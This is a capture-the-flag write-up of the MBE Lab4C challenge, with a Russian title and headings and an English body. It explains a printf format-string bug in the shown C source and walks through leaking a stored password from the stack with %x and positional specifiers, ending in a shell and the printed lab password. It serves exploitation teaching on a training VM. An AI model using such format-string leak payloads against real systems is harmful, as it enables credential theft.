---
title: "Разбор Lab4C (легко)"
permalink: /writeups/mbe/lab4c/
excerpt: "Разбор Lab4C."
---

---
MBE's **Lab04** is focused on format strings. First, log into the Lab04 as **Lab4C** (`lab4C:lab04start`) and go to the challenges folder:

```shell
$ ssh lab4C@<VM_IP>
$ cd /levels/lab04/
```

Let's execute the program:

```shell
lab4C@warzone:/levels/lab04$ ./lab4C 
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: Test
--[ Password: Pass
-----------------------------------------
Test does not have access!
```

This program asks for a *username* and a *password*, but we don't have these credentials.

## Анализ исходного кода

As a reminder, the behavior of the [printf()](https://cplusplus.com/reference/cstdio/printf/) function is controlled by the **format specifiers**. The function retrieves the parameters requested by the format specifier from the stack.

```c
printf("You are so %d !\n", 1337);
```

This format specifier defines the type of conversion of the format function, here a decimal (or `%d`). But if you try to print a variable without specifying the format string, you could get in trouble...

```c
printf(user);
```

Here, if the variable contains a username, it'll print the username. But if it contains a format specifier like **%x**, the application will fetch a value from the stack, treat this value as an address, and print out the memory contents pointed by this address as a string, until a NULL character is encountered. Of course, if the pointer is not valid or if the address is memory protected (i.e. a kernel address), the program will crash.

Now, the source code :

```c
#define PASS_LEN 30

int main(int argc, char *argv[])
{
    char username[100] = {0};
    char real_pass[PASS_LEN] = {0};
    char in_pass[100] = {0};
    FILE *pass_file = NULL;
    int rsize = 0;

    /* open the password file */
    pass_file = fopen("/home/lab4B/.pass", "r");
    if (pass_file == NULL) {
        fprintf(stderr, "ERROR: failed to open password file\n");
        exit(EXIT_FAILURE);
    }

    /* read the contents of the password file */
    rsize = fread(real_pass, 1, PASS_LEN, pass_file);
    real_pass[strcspn(real_pass, "\n")] = '\0';  // strip \n
    if (rsize != PASS_LEN) {
        fprintf(stderr, "ERROR: failed to read password file\n");
        exit(EXIT_FAILURE);
    }

    /* close the password file */
    fclose(pass_file);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("-----------------------------------------");
    puts("- You must login to access this system. -");
    puts("-----------------------------------------");

    /* read username securely */
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = '\0';    // strip \n

    /* read input password securely */
    printf("--[ Password: ");
    fgets(in_pass, sizeof(in_pass), stdin);
    in_pass[strcspn(in_pass, "\n")] = '\0';      // strip \n

    puts("-----------------------------------------");

    /* log the user in if the password is correct */
    if(!strncmp(real_pass, in_pass, PASS_LEN)){
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
    } else {
        printf(username);
        printf(" does not have access!\n");
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
```

First, we have to locate the format string vulnerability. It's right here :

```c 
if(!strncmp(real_pass, in_pass, PASS_LEN)){
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
    } else {
        printf(username);
        printf(" does not have access!\n");
        exit(EXIT_FAILURE);
    }
```

The *printf()* function for **username** does not provide any format specifier. Let's try to exploit that:

```shell
lab4C@warzone:/levels/lab04$ ./lab4C 
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %x
--[ Password: blah
-----------------------------------------
bffff5a2 does not have access!
```

We can even get more data!

```shell
lab4C@warzone:/levels/lab04$ ./lab4C 
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %x.%x.%x.%x
--[ Password: Blah
-----------------------------------------
bffff5a2.1e.804a008.6c420000 does not have access!
```

## Динамический анализ

Here, dynamic analysis will be a bit complex because of the following piece of code:

```c
pass_file = fopen("/home/lab4B/.pass", "r");
if (pass_file == NULL) {
      fprintf(stderr, "ERROR: failed to open password file\n");
      exit(EXIT_FAILURE);
}
```

By running that code into `gdb` it'll keep exiting as we won't be able to get the privileges of **lab3B** in the debugger. But we don't really need to debug the code!

As we can read what's stored on the stack, and because of the following comparison, the value of **real_pass** is already stored in memory. We just need to keep reading the stack until it reaches the value **real_pass**.

```c 
if(!strncmp(real_pass, in_pass, PASS_LEN)){
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
    } else {
        printf(username);
        printf(" does not have access!\n");
        exit(EXIT_FAILURE);
    }
```

How to know if it is the password? Easy, it'll look like hexadecimal ASCII values :)

```shell
lab4C@warzone:/levels/lab04$ ./lab4C 
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 
--[ Password: -----------------------------------------
bffff5a2.1e.804a008.78250000.2e78252e.252e7825.78252e78.2e78252e.252e7825.78.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.75620000.74315f37.7334775f.625f376e.33745572. does not have access!
```

See that: "75620000.74315f37.7334775f.625f376e.33745572", it does look like ASCII in hex. Let's try to convert it to readable ASCII without: **ubt1_7s4w_b_7n3tUr**. However, it's not complete. As, **username** is only 100 bytes long, we cannot read further on the stack. But we can set a positional parameter to a format specifier! It'll look like this:  **%\<pos\>$x**.

```shell
lab4C@warzone:/levels/lab04$ ./lab4C 
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %26$x.%27$x.%28$x.%29$x.%30$x.%31$x.%32$x.%33$x.%34$x.%35$x.%36$x.%37$x.%38$x.%39$x.%40$x.%41$x
--[ Password: 
-----------------------------------------
0.0.0.75620000.74315f37.7334775f.625f376e.33745572.7230665f.62343363.216531.24363225.32252e73.2e782437.24383225.32252e78 does not have access!
```

Looks good, now we have to reverse it! You take each 4 bytes, convert it to ASCII and reverse the order of the letters. For example, **75620000** = **ub**, then reverse = **bu**. It did it manually...

## Решение

Now, we can solve this challenge!

```shell
lab4C@warzone:/levels/lab04$ ./lab4C 
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: Blah
--[ Password: bu7_1t_w4sn7_brUt3_f0rc34b1e!
-----------------------------------------
Greetings, Blah!
$ whoami
lab4B
$ cat /home/lab4B/.pass
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

You can go to the next [challenge](/writeups/mbe/lab4b/)!
